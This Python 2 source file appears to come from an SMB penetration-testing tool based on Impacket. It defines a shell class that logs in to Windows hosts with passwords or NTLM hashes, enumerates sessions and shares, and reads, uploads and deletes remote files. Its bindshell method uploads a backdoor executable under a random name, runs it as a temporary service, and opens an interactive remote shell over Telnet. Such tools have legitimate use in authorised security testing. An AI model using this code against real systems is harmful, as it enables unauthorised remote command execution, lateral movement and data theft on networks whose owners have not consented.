#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

from lib.atexec import AtSvc
from lib.common import *
from lib.psexec import PsExec
from lib.rpcdump import RpcDump
from lib.samrdump import Samr
from lib.services import SvcCtl

#######################################################
# Enhanced version of Impacket's smbclient.py example #
#######################################################
class SMBShell(AtSvc, PsExec, RpcDump, Samr, SvcCtl):
    def __init__(self, target, credential, local_name):
        self.__dstip = target.getHost()
        self.__dstport = target.getPort()
        self.__user = credential.getUser()
        self.__password = credential.getPassword()
        self.__lmhash = credential.getLMhash()
        self.__nthash = credential.getNThash()
        self.__domain = credential.getDomain()
        self.__srcfile = local_name

        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
        self.__timeout = 120

        self.smb = None
        self.tid = None
        self.pwd = '\\'
        self.share = ''
        self.shares_list = []
        self.domains_dict = {}
        self.users_list = set()
        self.completion = []

        self.connect()
        logger.debug('Connection to host %s established' % target.getIdentity())
        self.login()
        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))

    def connect(self):
        '''
        Connect the SMB session
        '''
        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)

    def login(self):
        '''
        Login over the SMB session
        '''
        try:
            self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.error('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def logoff(self):
        self.smb.logoff()

    def smb_transport(self, named_pipe):
        '''
        Initiate a SMB connection on a specific named pipe
        '''
        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe, smb_connection=self.smb)

        try:
            self.trans.connect()
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.warn('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def check_share(self, share=None):
        #logger.debug("Into check_share with share: %s, self.share is: %s and self.tid is: %s" % (share, self.share, self.tid))

        if share:
            self.use(share)
        elif not share and (self.share is None or self.tid is None):
            logger.warn('Share has not been specified, select one')
            self.shares()

    def info(self):
        logger.debug('Binding on Server Service (SRVSVC) interface')
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
        self.__resp = self.__svc.get_server_info_102(self.trans.get_dip())
        self.__dce.disconnect()

        print 'Operating system: %s' % self.smb.getServerOS()
        print 'Netbios name: %s' % self.smb.getServerName()
        print 'Domain: %s' % self.smb.getServerDomain()
        print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
        print 'NTLMv2 support: %s' % self.smb.doesSupportNTLMv2()
        print 'UserPath: %s' % self.__resp['UserPath']
        print 'Simultaneous users: %d' % self.__resp['Users']
        print 'Version major: %d' % self.__resp['VersionMajor']
        print 'Version minor: %d' % self.__resp['VersionMinor']
        print 'Comment: %s' % self.__resp['Comment'] or ''

        # TODO: uncomment when SMBConnection will have a wrapper
        # getServerTime() method for both SMBv1,2,3
        #print 'Time: %s' % self.smb.get_server_time()

    def who(self):
        logger.debug('Binding on Server Service (SRVSVC) interface')
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
        resp = self.__svc.NetrSessionEnum()

        for session in resp:
            print "host: %15s, user: %5s, active: %5d, idle: %5d, type: %5s, transport: %s" % (session['HostName'].decode('utf-16le')[:-1], session['UserName'].decode('utf-16le')[:-1], session['Active'], session['IDLE'], session['Type'].decode('utf-16le')[:-1],session['Transport'].decode('utf-16le')[:-1] )

        self.__dce.disconnect()

    def shares(self):
        self.__resp = self.smb.listShares()
        count = 0

        for i in range(len(self.__resp)):
            name = self.__resp[i]['NetName'].decode('utf-16')
            comment = self.__resp[i]['Remark'].decode('utf-16')
            count += 1
            self.shares_list.append(name)

            print '[%d] %s (comment: %s)' % (count, name, comment)

        msg = 'Which share do you want to connect to? (default: 1) '
        limit = len(self.shares_list)
        choice = read_input(msg, limit)

        self.use(self.shares_list[choice-1])

    def use(self, share):
        if not share:
            raise missingShare, 'Share has not been specified'

        if self.tid:
            self.smb.disconnectTree(self.tid)

        self.share = share.strip('\x00')
        self.tid = self.smb.connectTree(self.share)
        self.pwd = '\\'
        self.ls('', False)

    def cd(self, path):
        if not path:
            return

        self.check_share()
        path = ntpath.normpath(path)
        self.__oldpwd = self.pwd

        if path == '.':
            return
        elif path == '..':
            sep = self.pwd.split('\\')
            self.pwd = ''.join('\\%s' % s for s in sep[:-1])
            return

        if path[0] == '\\':
           self.pwd = path
        else:
           self.pwd = ntpath.join(self.pwd, path)

        # Let's try to open the directory to see if it's valid
        try:
            fid = self.smb.openFile(self.tid, self.pwd)
            self.smb.closeFile(self.tid, fid)
            logger.warn('File is not a directory')
            self.pwd = self.__oldpwd
        except SessionError, e:
            if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
               pass
            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                logger.warn('Access denied')
                self.pwd = self.__oldpwd
            elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
                logger.warn('File not found')
                self.pwd = self.__oldpwd
            else:
                logger.warn('SMB error: %s' % (e.getErrorString(), ))
                self.pwd = self.__oldpwd

    def get_pwd(self):
        print ntpath.join(self.share, self.pwd)

    def ls(self, path, display=True):
        self.check_share()

        if not path:
            pwd = ntpath.join(self.pwd, '*')
        else:
            pwd = ntpath.join(self.pwd, path)

        self.completion = []
        pwd = ntpath.normpath(pwd)
        files = self.smb.listPath(self.share, pwd)

        for f in files:
            if display is True:
                print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())

            self.completion.append((f.get_longname(),f.is_directory(), f.get_filesize()))

    def cat(self, filename):
        filename = os.path.basename(filename)
        self.ls(filename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                continue

            logger.debug('Reading file %s\\%s (%d bytes)..' % (self.share, identified_file, size))

            try:
                cat_file = ntpath.join(self.pwd, ntpath.normpath(identified_file))
                self.fid = self.smb.openFile(self.tid, cat_file)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                else:
                    logger.error('SMB error: %s' % (e.getErrorString(), ))
                continue

            offset = 0

            while 1:
                try:
                    data = self.smb.readFile(self.tid, self.fid, offset)
                    print data

                    if len(data) == 0:
                        break

                    offset += len(data)
                except SessionError, e:
                    if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
                        break
                    else:
                        logger.error('SMB error: %s' % (e.getErrorString(), ))

            self.smb.closeFile(self.tid, self.fid)

    def download(self, filename):
        filename = os.path.basename(filename)
        self.ls(filename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                continue

            logger.debug('Downloading file %s\\%s (%d bytes)..' % (self.share, identified_file, size))

            try:
                fh = open(identified_file, 'wb')
                download_file = ntpath.join(self.pwd, ntpath.normpath(identified_file))
                self.smb.getFile(self.share, download_file, fh.write)
                fh.close()
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('SMB error: %s' % (e.getErrorString(), ))

    def upload(self, pathname, destfile=None):
        if not isinstance(pathname, basestring):
            files = [pathname]
        else:
            files = glob.glob(pathname)

        for filename in files:
            try:
                if isinstance(filename, basestring):
                    fp = open(filename, 'rb')
                else:
                    fp = filename
            except IOError:
                logger.error('Unable to open file %s' % filename)
                return False

            self.check_share()

            if not destfile or len(files) > 1:
                destfile = os.path.basename(filename)
                destfile = ntpath.join(self.pwd, ntpath.normpath(destfile))

            logger.debug('Uploading file %s to %s\\%s..' % (filename, self.share, destfile))

            self.smb.putFile(self.share, destfile, fp.read)
            fp.close()

    def rename(self, srcfile, destfile=None):
        self.check_share()
        srcfile = ntpath.join(self.pwd, ntpath.normpath(srcfile))
        destfile = ntpath.join(self.pwd, ntpath.normpath(destfile))
        self.smb.rename(self.share, srcfile, destfile)

    def mkdir(self, path):
        self.check_share()
        path = ntpath.join(self.pwd, ntpath.normpath(path))
        self.smb.createDirectory(self.share, path)

    def rm(self, filename):
        self.check_share()
        filename = ntpath.join(self.pwd, ntpath.normpath(filename))
        self.ls(filename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                continue

            logger.debug('Removing file %s\\%s (%d bytes)..' % (self.share, identified_file, size))

            try:
                self.smb.deleteFile(self.share, identified_file)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)

    def rmdir(self, path):
        self.check_share()
        path = ntpath.join(self.pwd, ntpath.normpath(path))
        self.ls(path, display=False)

        for identified_path, is_directory, _ in self.completion:
            if is_directory <= 0:
                continue

            logger.debug('Removing directory %s\\%s..' % (self.share, identified_path))

            try:
                self.smb.deleteDirectory(self.share, identified_path)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)

    def bindshell(self, port):
        connected = False
        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])

        if not os.path.exists(local_file):
            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'

        logger.info('Launching interactive shell')
        logger.debug('Going to use temporary service %s' % srvname)

        if not port:
            port = 4445
        elif not isinstance(port, int):
            port = int(port)

        self.deploy(srvname, local_file, port, remote_file)

        logger.info('Connecting to backdoor on port %d, wait..' % port)

        for counter in xrange(0, 3):
            try:
                time.sleep(1)

                if str(sys.version.split()[0]) >= '2.6':
                    tn = Telnet(self.__dstip, port, 3)
                else:
                    tn = Telnet(self.__dstip, port)

                connected = True
                tn.interact()
            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
                if connected is False:
                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])

                    if counter < 2:
                        warn_msg += ', retrying..'
                        logger.warn(warn_msg)
                    else:
                        logger.error(warn_msg)
            except SessionError, e:
                #traceback.print_exc()
                logger.error('SMB error: %s' % (e.getErrorString(), ))
            except KeyboardInterrupt, _:
                print
                logger.info('User aborted')
            except Exception, e:
                #traceback.print_exc()
                logger.error(str(e))

            if connected is True:
                tn.close()
                sys.stdout.flush()
                break

        time.sleep(1)
        self.undeploy(srvname)
